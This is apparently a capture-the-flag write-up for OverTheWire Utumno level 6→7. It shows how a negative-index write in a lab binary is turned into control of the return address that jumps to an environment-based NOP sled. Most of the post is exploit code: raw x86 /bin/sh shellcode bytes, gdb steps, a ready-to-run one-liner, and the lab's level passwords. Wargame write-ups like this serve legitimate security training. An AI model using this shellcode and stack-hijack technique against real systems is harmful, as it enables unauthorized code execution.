---
date: 2023-09-14 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Utumno Level 6 → 7 tutorial!!"
permalink: /posts/overTheWire-Utumno-Level-6-to-7/
tags: [overthewire, utumno, pwn, strtoul, pointer-trick, envp, shellcode, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Utumno Level 6 → 7!!"
---

<!-- Scoped styles -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Utumno level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Utumno-Level-5-to-6/' | relative_url }}">← Previous: Level 5 → 6</a>
  </div>
  <div class="nav-center">
    <a href="https://overthewire.org/wargames/utumno/utumno7.html" target="_blank" rel="noopener">Official (Level 7) ↗</a>
  </div>
  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Utumno-Level-7-to-8/' | relative_url }}">Next: Level 7 → 8 →</a>
  </div>
</nav>

## Login

Use the password from **Level 5 → 6**:

```bash
ssh utumno6@utumno.labs.overthewire.org -p 2227
# password: eiluquieth
````

Then move to the game folder:

```bash
cd /utumno
```

---

## Task

Binary: **`/utumno/utumno6`**

* Requires **three arguments**:

  1. **index** (base-10),
  2. **value** (base-16),
  3. **description** (string).
* It stores `value` into a **stack table** at `table[index]`, copies the description into a heap buffer, then prints:

```
Table position <index> has value <value>
Description: <desc>
```

**Goal:** Abuse indexing with **`index = -1`** so the program treats the **second argument as a pointer**, then make that pointer reference our **third argument**, which we fill with an address into an **env-based NOP sled + shellcode**. Return lands in the sled → gets a shell.

---

## Source Code (Disassembly Excerpt)

Key parts from `main`:

```asm
cmp  [ebp+0x8], 0x2         ; need ≥ 3 args
jg   ok
puts("Missing args"); exit(1)

ok:
ptr = malloc(0x20)          ; heap buffer for description
...
val = strtoul(argv[2], 0, 16) ; base-16 "value"
idx = strtoul(argv[1], 0, 10) ; base-10 "index"
cmp  idx, 0xA               ; if idx > 10 → exit
jle  within
puts("Out of bounds"); exit(1)

within:
[ebp + idx*4 - 0x30] = val  ; write into stack table
strcpy(ptr, argv[3])        ; store description on heap (not directly vuln)
printf("Table position %u has value %u\nDescription: %s\n", idx, table[idx], ptr)
```

**Observation:** With `idx = -1` (i.e., `0xFFFFFFFF`), the write turns into:

```
[ebp - 0x34] = val
```

Later behavior lets **`val` be dereferenced/used** such that it can influence control flow. Practically, you can set `val` to a **stack address** that **points to your 3rd argument**, and place your **desired 4-byte RET** there.

---

## Exploitation Steps

### 1) Recon behavior

```bash
./utumno6
# Missing args
./utumno6 1 2
# Segmentation fault
./utumno6 1 2 3
# Table position 1 has value 2
# Description: 3
```

### 2) Prove pointer control with `index = -1`

Outside gdb:

```bash
strace ./utumno6 -1 0x41414141 foobar
# ... SIGSEGV si_addr=0x41414141
```

Inside gdb you may see libc faults instead; so grab a **valid stack address** (e.g., from `$esp`) and use that as `value`:

```gdb
(gdb) run -1 0x41414141 BBBB
# SIGSEGV in libc

(gdb) x/16x $esp
# e.g., 0xffffd628 appears on stack

(gdb) run -1 0xffffd628 BBBB
# SIGSEGV at 0x42424242  → EIP == 'BBBB'
```

This shows **`argv[2]` used as a pointer to `argv[3]`**, and the 4 bytes in `argv[3]` become the **return address**.

---

### 3) Stage env shellcode and locate it

Export **EGG** with a long **NOP sled** + `/bin//sh` shellcode:

```bash
export EGG=$(python -c "print 300*'\x90' + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'")
```

Crash once to read a stable `$esp`, then scan memory to find EGG:

```gdb
(gdb) run -1 0xffffffff $(python -c "print 'BBBB'")
# crash…
(gdb) info reg esp
# esp = 0xffffd4e8  (example)

(gdb) x/2048x $esp
# ... You'll see the EGG env with many 0x90 and your shellcode bytes ...
# e.g., sled around 0xffffddcc
```

### 4) Aim the pointer to your third arg & place sled address there

Now set:

* **`argv[2]`** = address of **your current stack frame** (so it points to **`argv[3]`**),
* **`argv[3]`** = **little-endian address** somewhere **inside the NOP sled** (e.g., `0xffffddcc → "\xcc\xdd\xff\xff"`).

In gdb:

```gdb
(gdb) run -1 0xffffd4e8 $(python -c "print '\xcc\xdd\xff\xff'")
# process executes /bin/dash  → shell spawned
```

Outside gdb, stack layout shifts; add a small **+offset** to the second arg until it hits (increments of \~0x10–0x20 work well):

```bash
./utumno6 -1 0xffffd518 $(python -c "print '\xcc\xdd\xff\xff'")
$ whoami
utumno7
$ cat /etc/utumno_pass/utumno7
totiquegae
```

---

## Password

From my run:

```
totiquegae
```

---

## Quick One-liner

```bash
export EGG=$(python - <<'PY'
print 300*'\x90' + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
PY
)
# Try a few nearby stack pointers for argv[2]; argv[3] = sled address (LE)
./utumno6 -1 0xffffd518 $(python -c "print '\xcc\xdd\xff\xff'") && whoami && cat /etc/utumno_pass/utumno7
```

---

## Troubleshooting

* **Still “Missing args”?** Provide all three: `<index> <value> <desc>`.
* **Pointer trick not working in gdb?** Use a **valid stack address** (e.g., current `$esp`) for `argv[2]`. Outside gdb, adjust it upward/downward by small steps.
* **No sled found?** Re-export `EGG` with a longer NOP sled and rescan memory (`x/2048x $esp`).
* **Crash at libc instead of EIP control?** That’s normal in gdb—use the **stack address approach** to point `argv[2]` at `argv[3]`.
* **Endianness gotcha:** The 3rd arg must be **little-endian** bytes of your sled address.

---

**Congrats 🎉** You turned a **negative index** into a **write-what-where pointer trick**, then jumped into an **env-based sled** for clean code execution. Onward to **Level 7 → 8**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

